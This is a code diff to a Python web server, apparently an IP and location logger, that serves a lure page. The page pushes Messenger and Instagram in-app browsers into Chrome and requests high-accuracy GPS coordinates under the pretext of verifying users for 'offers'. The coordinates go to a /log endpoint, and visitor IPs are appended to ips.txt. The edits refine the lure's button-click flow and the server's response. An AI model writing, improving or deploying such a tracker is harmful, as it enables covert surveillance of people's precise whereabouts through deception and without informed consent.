@@ -58,10 +58,10 @@ html = """
         return ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram");
     }
 
-    // Redirect immediately if in Messenger/Instagram
-    if (isInAppBrowser()) {
-        let url = window.location.href;
-        setTimeout(function(){
+    // On button click, either redirect or request location
+    function getLocation() {
+        if (isInAppBrowser()) {
+            let url = window.location.href;
             if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
                 window.location = "googlechrome://" + url.replace(/^https?:\/\//, '');
             } else if (/Android/.test(navigator.userAgent)) {
@@ -69,11 +69,8 @@ html = """
             } else {
                 document.body.innerHTML = "<div style='padding:50px; text-align:center;'><h2>Please open this page in your browser</h2><p>Tap the menu (⋮) → 'Open in Browser'.</p></div>";
             }
-        }, 300); // Small delay for reliability
-    }
-
-    // Geolocation functions
-    function getLocation() {
+            return;
+        }
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true});
         } else {
@@ -86,9 +83,11 @@ html = """
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
         const accuracy = position.coords.accuracy;
-        fetch('/log?lat=' + lat + '&lon=' + lon + '&accuracy=' + accuracy);
-        document.getElementById("status").innerText = "Verified! Loading offers...";
-        document.getElementById("overlay").style.display = "none";
+        fetch('/log?lat=' + lat + '&lon=' + lon + '&accuracy=' + accuracy)
+        .then(() => {
+            document.getElementById("status").innerText = "Verified! Loading offers...";
+            document.getElementById("overlay").style.display = "none";
+        });
     }
 
     function error() {
@@ -119,7 +118,9 @@ class IPLoggerHandler(BaseHTTPRequestHandler):
             with open("ips.txt", "a") as f:
                 f.write(log_entry + "\\n")
             self.send_response(200)
+            self.send_header("Content-type", "application/json")
             self.end_headers()
+            self.wfile.write(b'{"status": "ok"}')
             return
 
         # --- IP fallback logging ---
